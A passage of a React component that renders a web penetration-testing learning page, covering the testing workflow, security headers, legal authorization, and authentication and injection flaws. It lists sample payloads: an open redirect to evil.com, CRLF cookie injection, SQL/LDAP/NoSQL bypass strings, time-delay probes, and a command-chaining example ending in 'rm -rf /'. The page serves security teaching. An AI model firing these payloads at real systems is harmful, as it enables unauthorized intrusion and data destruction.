              { attack: "Open Redirect", payload: "//evil.com or /\\evil.com", target: "Login redirects, OAuth", severity: "Medium", color: "#3b82f6" },
              { attack: "CRLF Injection", payload: "%0d%0aSet-Cookie:admin=true", target: "Headers, logs", severity: "Medium", color: "#3b82f6" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper
                  sx={{
                    p: 2,
                    height: "100%",
                    bgcolor: alpha(item.color, 0.08),
                    border: `1px solid ${alpha(item.color, 0.2)}`,
                    borderRadius: 2,
                  }}
                >
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#e0e0e0" }}>
                      {item.attack}
                    </Typography>
                    <Chip
                      label={item.severity}
                      size="small"
                      sx={{ bgcolor: item.color, color: "white", fontSize: "0.65rem", height: 20 }}
                    />
                  </Box>
                  <Typography variant="caption" sx={{ color: "grey.500", display: "block", mb: 0.5 }}>
                    Target: {item.target}
                  </Typography>
                  <Typography
                    variant="caption"
                    sx={{
                      fontFamily: "monospace",
                      color: "#22c55e",
                      bgcolor: alpha("#22c55e", 0.1),
                      px: 0.5,
                      py: 0.25,
                      borderRadius: 0.5,
                      display: "inline-block",
                      wordBreak: "break-all",
                      fontSize: "0.7rem",
                    }}
                  >
                    {item.payload}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Pentesting Phases Workflow */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#22c55e", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <AccountTreeIcon sx={{ color: "#22c55e" }} />
            Pentesting Phases Workflow
          </Typography>

          <Grid container spacing={1}>
            {[
              { phase: "1", title: "Scoping", desc: "Define targets, rules of engagement, and testing windows", color: "#6366f1", duration: "1-2 days" },
              { phase: "2", title: "Reconnaissance", desc: "Passive and active information gathering about the target", color: "#8b5cf6", duration: "2-3 days" },
              { phase: "3", title: "Scanning", desc: "Port scanning, service enumeration, vulnerability scanning", color: "#a855f7", duration: "1-2 days" },
              { phase: "4", title: "Enumeration", desc: "Deep dive into discovered services, users, and configurations", color: "#d946ef", duration: "2-3 days" },
              { phase: "5", title: "Exploitation", desc: "Attempt to exploit identified vulnerabilities safely", color: "#ef4444", duration: "3-5 days" },
              { phase: "6", title: "Post-Exploitation", desc: "Privilege escalation, lateral movement, data exfiltration", color: "#f59e0b", duration: "2-3 days" },
              { phase: "7", title: "Reporting", desc: "Document findings, risk ratings, and remediation guidance", color: "#22c55e", duration: "2-3 days" },
              { phase: "8", title: "Remediation Support", desc: "Assist with fixes and verify remediation effectiveness", color: "#06b6d4", duration: "Ongoing" },
            ].map((item) => (
              <Grid item xs={6} sm={3} key={item.phase}>
                <Paper
                  sx={{
                    p: 2,
                    height: "100%",
                    bgcolor: alpha(item.color, 0.1),
                    border: `1px solid ${alpha(item.color, 0.3)}`,
                    borderRadius: 2,
                    position: "relative",
                  }}
                >
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Chip
                      label={item.phase}
                      size="small"
                      sx={{ bgcolor: item.color, color: "white", fontWeight: 700, minWidth: 24, height: 24 }}
                    />
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: item.color }}>
                      {item.title}
                    </Typography>
                  </Box>
                  <Typography variant="caption" sx={{ color: "grey.400", display: "block", mb: 1 }}>
                    {item.desc}
                  </Typography>
                  <Chip label={item.duration} size="small" sx={{ bgcolor: alpha(item.color, 0.2), color: item.color, fontSize: "0.65rem", height: 18 }} />
                </Paper>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* HTTP Headers & Status Codes Reference */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#06b6d4", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <HttpIcon sx={{ color: "#06b6d4" }} />
            HTTP Security Headers & Status Codes
          </Typography>

          <Grid container spacing={3}>
            {/* Security Headers */}
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#06b6d4", mb: 2 }}>
                Security Headers to Check
              </Typography>
              <List dense disablePadding>
                {[
                  { header: "Content-Security-Policy", status: "Missing = XSS risk", color: "#ef4444" },
                  { header: "X-Frame-Options", status: "Missing = Clickjacking", color: "#f59e0b" },
                  { header: "X-Content-Type-Options", status: "Should be: nosniff", color: "#22c55e" },
                  { header: "Strict-Transport-Security", status: "HSTS enforcement", color: "#8b5cf6" },
                  { header: "X-XSS-Protection", status: "Legacy, check CSP instead", color: "#6b7280" },
                  { header: "Referrer-Policy", status: "Controls referrer leakage", color: "#06b6d4" },
                  { header: "Permissions-Policy", status: "Feature restrictions", color: "#ec4899" },
                  { header: "Set-Cookie flags", status: "HttpOnly, Secure, SameSite", color: "#f59e0b" },
                ].map((item) => (
                  <ListItem key={item.header} sx={{ py: 0.5, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 32 }}>
                      <Box sx={{ width: 8, height: 8, borderRadius: "50%", bgcolor: item.color }} />
                    </ListItemIcon>
                    <ListItemText
                      primary={<Typography variant="body2" sx={{ fontFamily: "monospace", color: "#e0e0e0" }}>{item.header}</Typography>}
                      secondary={<Typography variant="caption" sx={{ color: "grey.500" }}>{item.status}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Grid>

            {/* Status Codes */}
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#f59e0b", mb: 2 }}>
                Interesting Status Codes
              </Typography>
              <Grid container spacing={1}>
                {[
                  { code: "200", meaning: "OK - Request succeeded", interest: "Normal response" },
                  { code: "301/302", meaning: "Redirect", interest: "Open redirect testing" },
                  { code: "400", meaning: "Bad Request", interest: "Input validation" },
                  { code: "401", meaning: "Unauthorized", interest: "Auth bypass attempts" },
                  { code: "403", meaning: "Forbidden", interest: "Authorization bypass" },
                  { code: "404", meaning: "Not Found", interest: "Hidden endpoint fuzzing" },
                  { code: "405", meaning: "Method Not Allowed", interest: "Try other HTTP methods" },
                  { code: "500", meaning: "Internal Server Error", interest: "Error-based info leak" },
                  { code: "502/503", meaning: "Bad Gateway/Unavailable", interest: "Backend issues" },
                ].map((item) => (
                  <Grid item xs={6} key={item.code}>
                    <Box sx={{ p: 1, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 1 }}>
                      <Chip label={item.code} size="small" sx={{ bgcolor: "#f59e0b", color: "white", fontWeight: 700, mb: 0.5 }} />
                      <Typography variant="caption" sx={{ color: "grey.400", display: "block" }}>
                        {item.meaning}
                      </Typography>
                      <Typography variant="caption" sx={{ color: "grey.500", fontSize: "0.65rem" }}>
                        {item.interest}
                      </Typography>
                    </Box>
                  </Grid>
                ))}
              </Grid>
            </Grid>
          </Grid>
        </Paper>

        {/* Overview and Methodology Section */}
        <Box id="methodology" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#6366f1", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
               Overview and Methodology
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 2 }}>
              Web application penetration testing is a systematic process of identifying, exploiting, and documenting security vulnerabilities in web applications. Unlike automated scanning, manual pentesting requires deep understanding of application logic, business context, and creative attack chains.
            </Typography>

            <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#6366f1", 0.05), borderRadius: 2, border: `1px solid ${alpha("#6366f1", 0.2)}` }}>
              <Typography variant="h6" sx={{ color: "#6366f1", fontWeight: 700, mb: 2 }}>
                The Professional Approach to Web Pentesting
              </Typography>
              <Typography variant="body2" color="text.secondary" paragraph>
                Effective web application penetration testing follows a structured methodology, not random vulnerability scanning. You're simulating a sophisticated attacker who understands the application's purpose, its users, and its value to the organization. This means thinking like both an attacker (finding weaknesses) and a defender (understanding impact).
              </Typography>

              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#3b82f6", fontWeight: 700, mb: 1 }}>
                      1. Reconnaissance & Mapping
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Understand the application's architecture, technology stack, entry points, and user roles. Map all functionality, endpoints, and data flows. Use tools like Burp Suite's spider, manual browsing, and JavaScript analysis. The more complete your map, the more vulnerabilities you'll find.
                    </Typography>
                  </Box>
                </Grid>

                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
                      2. Vulnerability Discovery
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Systematically test each component for common vulnerabilities (OWASP Top 10), then dive deeper into business logic flaws unique to the application. Use both automated tools (for coverage) and manual testing (for complex bugs that scanners miss).
                    </Typography>
                  </Box>
                </Grid>

                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                      3. Exploitation & Impact
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Don't just report "SQL injection exists" - demonstrate the actual impact. Can you extract the database? Achieve RCE? Access admin functions? Chain vulnerabilities together. Document proof-of-concepts with clear steps to reproduce and business risk assessment.
                    </Typography>
                  </Box>
                </Grid>
              </Grid>

              <Alert severity="info" sx={{ mt: 2, bgcolor: "transparent" }}>
                <Typography variant="body2">
                  <strong>Time Distribution:</strong> Professional pentesters typically spend 30% on reconnaissance/mapping, 50% on testing/exploitation, and 20% on documentation/reporting. Rushing through recon leads to missed vulnerabilities. Quality reporting is what clients pay for - technical findings mean nothing if stakeholders can't understand the risk.
                </Typography>
              </Alert>
            </Paper>

            <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#ef4444", fontWeight: 700, mb: 2 }}>
                 Legal and Ethical Considerations
              </Typography>
              <Typography variant="body2" color="text.secondary" paragraph>
                Web application pentesting without explicit written authorization is illegal in most jurisdictions and can result in criminal charges under computer fraud laws (CFAA in US, Computer Misuse Act in UK, etc.). Even if you "discover" a vulnerability accidentally, exploiting it without permission crosses legal boundaries.
              </Typography>

              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "white" }}>
                Required Before Testing:
              </Typography>
              <List dense>
                {[
                  "Signed contract/statement of work defining scope, timeline, and deliverables",
                  "Written authorization (letters of authorization) from legal owners of the systems",
                  "Clear scope document listing in-scope URLs, IP ranges, and test accounts",
                  "Out-of-scope items explicitly documented (production databases, third-party services, etc.)",
                  "Emergency contact information and escalation procedures",
                  "Testing window agreements (some tests only during off-hours)",
                  "Insurance coverage (E&O insurance recommended for professional testers)",
                ].map((item, i) => (
                  <ListItem key={i} sx={{ py: 0.5 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ color: "#22c55e", fontSize: 16 }} />
                    </ListItemIcon>
                    <ListItemText primary={<Typography variant="body2" color="text.secondary">{item}</Typography>} />
                  </ListItem>
                ))}
              </List>

              <Alert severity="error" sx={{ mt: 2 }}>
                <Typography variant="body2">
                  <strong>Bug Bounty  Carte Blanche:</strong> Even with bug bounty programs, read the rules carefully. Some exclude DoS testing, social engineering, or certain vulnerability types. Violating program rules can get you banned (or worse, sued). Always test on staging/dev environments when possible, never production unless explicitly allowed.
                </Typography>
              </Alert>
            </Paper>
            <TopicAccordion topics={overviewTopics} defaultExpanded />
          </Paper>
        </Box>

        {/* Authentication and Authorization Section */}
        <Box id="auth" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#3b82f6", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
               Authentication and Authorization
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 2 }}>
              Authentication (proving who you are) and Authorization (what you're allowed to do) are the gatekeepers of web application security. Flaws in these mechanisms are among the most exploited vulnerabilities, often leading to account takeover, privilege escalation, and complete application compromise.
            </Typography>

            <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ color: "#3b82f6", fontWeight: 700, mb: 2 }}>
                Understanding the Attack Surface
              </Typography>
              <Typography variant="body2" color="text.secondary" paragraph>
                Authentication and authorization are not single mechanisms - they're complex systems involving login forms, password reset flows, session tokens, API keys, OAuth flows, multi-factor authentication, and role-based access controls. Each component is a potential attack vector.
              </Typography>

              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
                    <Typography variant="subtitle2" sx={{ color: "#ef4444", fontWeight: 700, mb: 1 }}>
                       Common Authentication Vulnerabilities
                    </Typography>
                    <List dense>
                      {[
                        "Brute force attacks (no rate limiting, weak lockout policies)",
                        "Username enumeration (different responses for valid/invalid users)",
                        "Weak password policies (allowing '123456', 'password', short passwords)",
                        "Insecure password reset (predictable tokens, no expiration, token reuse)",
                        "SQL injection in login forms (bypassing authentication entirely)",
                        "Session fixation (attacker sets victim's session ID)",
                        "Missing or bypassable MFA (especially during password reset)",
                      ].map((vuln, i) => (
                        <ListItem key={i} sx={{ py: 0.5, pl: 0 }}>
                          <ListItemIcon sx={{ minWidth: 24 }}>
                            <WarningIcon sx={{ color: "#ef4444", fontSize: 14 }} />
                          </ListItemIcon>
                          <ListItemText primary={<Typography variant="caption" color="text.secondary">{vuln}</Typography>} />
                        </ListItem>
                      ))}
                    </List>
                  </Paper>
                </Grid>

                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                       Common Authorization Vulnerabilities
                    </Typography>
                    <List dense>
                      {[
                        "Insecure Direct Object References (IDOR) - accessing others' data",
                        "Missing function-level access control (accessing admin functions as user)",
                        "Horizontal privilege escalation (user A accessing user B's account)",
                        "Vertical privilege escalation (user accessing admin privileges)",
                        "Path traversal bypassing authentication (/admin/../../../admin)",
                        "Client-side authorization checks (easily bypassed in browser)",
                        "Forced browsing to unauthenticated pages (/admin without login)",
                      ].map((vuln, i) => (
                        <ListItem key={i} sx={{ py: 0.5, pl: 0 }}>
                          <ListItemIcon sx={{ minWidth: 24 }}>
                            <WarningIcon sx={{ color: "#f59e0b", fontSize: 14 }} />
                          </ListItemIcon>
                          <ListItemText primary={<Typography variant="caption" color="text.secondary">{vuln}</Typography>} />
                        </ListItem>
                      ))}
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Alert severity="warning" sx={{ mt: 2 }}>
                <Typography variant="body2">
                  <strong>Real-World Impact:</strong> In 2021, a simple IDOR vulnerability in Facebook allowed researchers to delete any photo from any user's account. In 2020, authorization bypass in multiple banking apps allowed users to access any account by changing a single parameter. These aren't theoretical - authorization flaws are consistently in OWASP Top 10 because they're common and devastating.
                </Typography>
              </Alert>
            </Paper>

            <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#22c55e", fontWeight: 700, mb: 2 }}>
                Testing Strategies and Techniques
              </Typography>
              <Typography variant="body2" color="text.secondary" paragraph>
                Effective authentication/authorization testing goes beyond automated scanners. You need to understand the application's user model, session management approach, and business logic.
              </Typography>

              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                       Testing Authentication
                    </Typography>
                    <Typography variant="caption" color="text.secondary" display="block" sx={{ mb: 1 }}>
                      Create multiple test accounts with different privilege levels. Test login with valid/invalid credentials, SQL injection payloads, and brute force attempts. Analyze password reset flows for token predictability. Check if MFA can be bypassed during password reset. Test remember-me functionality for cookie security.
                    </Typography>
                  </Box>
                </Grid>

                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                       Testing Authorization
                    </Typography>
                    <Typography variant="caption" color="text.secondary" display="block" sx={{ mb: 1 }}>
                      Log in as different user types (admin, regular user, guest). For every function, try accessing it as a lower-privileged user. Change object IDs in requests (user_id=1  user_id=2). Test API endpoints directly without UI. Check if client-side access controls can be bypassed by modifying JavaScript or using API directly.
                    </Typography>
                  </Box>
                </Grid>

                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                       Testing Session Management
                    </Typography>
                    <Typography variant="caption" color="text.secondary" display="block" sx={{ mb: 1 }}>
                      Check session tokens for randomness, length, and entropy. Test for session fixation by setting cookies before login. Verify logout destroys sessions server-side. Check session timeout policies. Test concurrent sessions. Look for session tokens in URLs (huge security risk). Verify HTTPS-only and HttpOnly cookie flags.
                    </Typography>
                  </Box>
                </Grid>
              </Grid>
            </Paper>
            <TopicAccordion topics={authTopics} defaultExpanded />
          </Paper>
        </Box>

        {/* Injection Attacks Section */}
        <Box id="injection" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#ef4444", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
               Injection Attacks
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 2 }}>
              Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing unauthorized data. Injection has been #1 on the OWASP Top 10 for years because it's both common and catastrophic.
            </Typography>

            <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
              <Typography variant="h6" sx={{ color: "#ef4444", fontWeight: 700, mb: 2 }}>
                Why Injection Attacks are So Dangerous
              </Typography>
              <Typography variant="body2" color="text.secondary" paragraph>
                Injection flaws allow attackers to bypass all security controls because they're exploiting the fundamental way the application processes data. When you inject malicious SQL, you're not breaking into the database - you're using the application's own database connection, with all its privileges. The application becomes your unwitting accomplice.
              </Typography>

              <Grid container spacing={2}>
                <Grid item xs={12} md={3}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.1), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h4" sx={{ color: "#dc2626", fontWeight: 700 }}>
                      #1
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      OWASP Top 10 Ranking (consistently)
                    </Typography>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.1), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h4" sx={{ color: "#dc2626", fontWeight: 700 }}>
                      9.8
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      Average CVSS Score (Critical)
                    </Typography>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.1), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h4" sx={{ color: "#dc2626", fontWeight: 700 }}>
                      274k
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      Tested instances in 2021 (OWASP data)
                    </Typography>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.1), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h4" sx={{ color: "#dc2626", fontWeight: 700 }}>
                      94%
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      Apps tested had some injection flaw
                    </Typography>
                  </Paper>
                </Grid>
              </Grid>

              <Alert severity="error" sx={{ mt: 2 }}>
                <Typography variant="body2">
                  <strong>Historic Breaches:</strong> Equifax (2017) - 147 million records stolen via Apache Struts SQLi. TalkTalk (2015) - 400,000 fine for SQL injection. Yahoo (2012) - 450,000 passwords via SQLi. These weren't sophisticated zero-days - they were basic injection flaws that could have been prevented with parameterized queries.
                </Typography>
              </Alert>
            </Paper>

            <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 2 }}>
                Types of Injection Attacks
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, mb: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#3b82f6", fontWeight: 700, mb: 1 }}>
                      1. SQL Injection (SQLi)
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph sx={{ fontSize: "0.85rem" }}>
                      The most common injection type. Attackers inject SQL commands into input fields to manipulate database queries. Can lead to authentication bypass, data extraction, modification, or deletion.
                    </Typography>
                    <Typography variant="caption" color="text.secondary" display="block" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.3), p: 1, borderRadius: 1 }}>
                      Example: ' OR '1'='1 <br />
                      Result: Bypasses login by making WHERE clause always true
                    </Typography>
                  </Box>

                  <Box sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, mb: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
                      2. OS Command Injection
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph sx={{ fontSize: "0.85rem" }}>
                      Execute arbitrary operating system commands on the server. Often found in features that interact with the filesystem, perform system operations, or call external programs.
                    </Typography>
                    <Typography variant="caption" color="text.secondary" display="block" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.3), p: 1, borderRadius: 1 }}>
                      Example: file.pdf; rm -rf / <br />
                      Result: Command chaining can delete files or download malware
                    </Typography>
                  </Box>
                </Grid>

                <Grid item xs={12} md={6}>
                  <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, mb: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                      3. LDAP Injection
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph sx={{ fontSize: "0.85rem" }}>
                      Manipulate LDAP queries used for authentication or directory access. Common in enterprise applications using Active Directory or other LDAP directories.
                    </Typography>
                    <Typography variant="caption" color="text.secondary" display="block" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.3), p: 1, borderRadius: 1 }}>
                      Example: *)(uid=*))(|(uid=* <br />
                      Result: Bypasses authentication or extracts directory data
                    </Typography>
                  </Box>

                  <Box sx={{ p: 2, bgcolor: alpha("#ec4899", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#ec4899", fontWeight: 700, mb: 1 }}>
                      4. NoSQL Injection
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph sx={{ fontSize: "0.85rem" }}>
                      Target NoSQL databases (MongoDB, CouchDB, etc.) by injecting operators or manipulating query structure. Often overlooked because developers assume NoSQL = injection-proof.
                    </Typography>
                    <Typography variant="caption" color="text.secondary" display="block" sx={{ fontFamily: "monospace", bgcolor: alpha("#000", 0.3), p: 1, borderRadius: 1 }}>
                      Example: {`{"user": {"$gt": ""}}`} <br />
                      Result: MongoDB operator injection bypasses authentication
                    </Typography>
                  </Box>
                </Grid>
              </Grid>
            </Paper>

            <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#22c55e", fontWeight: 700, mb: 2 }}>
                SQL Injection Deep Dive: From Detection to Exploitation
              </Typography>
              <Typography variant="body2" color="text.secondary" paragraph>
                SQL injection is the most impactful injection type. Understanding it deeply helps you find and exploit other injection types using similar methodology.
              </Typography>

              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#3b82f6" }}>
                      Step 1: Detection
                    </Typography>
                    <List dense>
                      {[
                        "Add single quote (') - look for SQL errors",
                        "Boolean logic: ' AND '1'='1 vs ' AND '1'='2",
                        "Time delays: ' OR SLEEP(5)-- (MySQL)",
                        "Stacking queries: '; SELECT pg_sleep(5)--",
                        "Out-of-band: ' UNION SELECT ... INTO OUTFILE",
                      ].map((item, i) => (
                        <ListItem key={i} sx={{ py: 0.5, pl: 0 }}>
                          <ListItemIcon sx={{ minWidth: 20 }}>
                            <CheckCircleIcon sx={{ color: "#22c55e", fontSize: 12 }} />
                          </ListItemIcon>
                          <ListItemText primary={<Typography variant="caption" sx={{ fontFamily: "monospace" }}>{item}</Typography>} />
                        </ListItem>
                      ))}
                    </List>
                  </Box>
                </Grid>

                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
                      Step 2: Exploitation
                    </Typography>
                    <List dense>
                      {[
                        "UNION attacks: extract data from other tables",
                        "Error-based: force errors revealing data",
                        "Blind SQLi: infer data via Boolean/time responses",
                        "Stacked queries: execute multiple statements",
                        "Second-order: stored injection triggers later",
                      ].map((item, i) => (
                        <ListItem key={i} sx={{ py: 0.5, pl: 0 }}>
                          <ListItemIcon sx={{ minWidth: 20 }}>
                            <CheckCircleIcon sx={{ color: "#22c55e", fontSize: 12 }} />
                          </ListItemIcon>
                          <ListItemText primary={<Typography variant="caption" sx={{ fontFamily: "monospace" }}>{item}</Typography>} />
                        </ListItem>
                      ))}
                    </List>
                  </Box>
                </Grid>

                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f59e0b" }}>
                      Step 3: Post-Exploitation
                    </Typography>
                    <List dense>
                      {[
                        "Extract entire database schema",
                        "Dump user credentials/hashes",
                        "Read server files (LOAD_FILE)",
                        "Write web shells (INTO OUTFILE)",
                        "Execute OS commands (xp_cmdshell)",
                      ].map((item, i) => (
                        <ListItem key={i} sx={{ py: 0.5, pl: 0 }}>
                          <ListItemIcon sx={{ minWidth: 20 }}>
                            <CheckCircleIcon sx={{ color: "#22c55e", fontSize: 12 }} />
                          </ListItemIcon>
                          <ListItemText primary={<Typography variant="caption" sx={{ fontFamily: "monospace" }}>{item}</Typography>} />
                        </ListItem>
                      ))}
                    </List>
                  </Box>
                </Grid>
              </Grid>

              <Alert severity="info" sx={{ mt: 2 }}>
                <Typography variant="body2">
                  <strong>Tool Recommendation:</strong> sqlmap automates SQL injection exploitation but understanding manual techniques is essential. Use sqlmap for efficiency, but know how to craft payloads manually for WAF bypass and custom scenarios. Burp Suite's SQLi scanner catches basic cases; manual testing finds the complex ones.
                </Typography>
              </Alert>
            </Paper>
            <TopicAccordion topics={injectionTopics} defaultExpanded />
          </Paper>
        </Box>

        {/* Server-Side Attacks Section */}
        <Box id="server-side" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#8b5cf6", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
               Advanced Server-Side Attacks
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Server-side vulnerabilities can lead to remote code execution, internal network access,
              and complete infrastructure compromise.
            </Typography>

            {/* Why Server-Side Attacks are Critical */}
            <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#8b5cf6", 0.03), border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                Why Server-Side Attacks are Critical
              </Typography>
              <Typography variant="body2" paragraph color="text.secondary">
                Unlike client-side attacks that target individual users, server-side vulnerabilities compromise the entire application infrastructure.
                A successful server-side attack can give an attacker complete control over your servers, access to all user data, ability to pivot
                to internal networks, and the capability to modify application behavior for all users simultaneously.
              </Typography>
              <Typography variant="body2" color="text.secondary">
                These attacks are particularly dangerous because they often bypass all client-side security controls and directly interact with your
